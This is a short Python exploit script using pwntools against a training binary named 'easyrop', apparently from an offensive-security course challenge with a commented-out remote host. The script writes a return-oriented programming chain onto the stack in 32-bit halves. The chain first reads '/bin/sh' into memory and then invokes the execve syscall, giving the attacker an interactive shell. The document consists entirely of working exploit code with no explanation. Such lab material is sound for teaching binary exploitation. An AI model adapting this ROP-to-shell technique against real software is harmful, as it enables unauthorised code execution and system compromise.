from pwn import *

r = process("./easyrop")
#r = remote("bin.training.offdef.it", 2015)

"""gdb.attach(r, ''''
    b *0x040021f
''')

input("Wait")"""

def halfonstack(value):
    r.send(p32(value))
    r.send(p32(0))

def onstack(value):
    onehalf = value & 0xffffffff
    otherhalf = value >> 32

    halfonstack(onehalf)
    halfonstack(otherhalf)

pop_rdi_rsi_rdx_rax = 0x04001c2
read = 0x400144
binsh = 0x600500
syscall = 0x0400168  #syscall function inside the binary

chain = [0x0]*7
chain += [
    pop_rdi_rsi_rdx_rax,
    0,
    binsh,
    8,
    0,
    read,
    pop_rdi_rsi_rdx_rax,
    binsh,
    0,
    0,
    0x3b,
    syscall
]

for i in chain:
    onstack(i)

r.send("\n")
time.sleep(0.1)  #to stop the first read (do a short read)
r.send("\n")
time.sleep(0.1)

r.send("/bin/sh\x00")
r.interactive()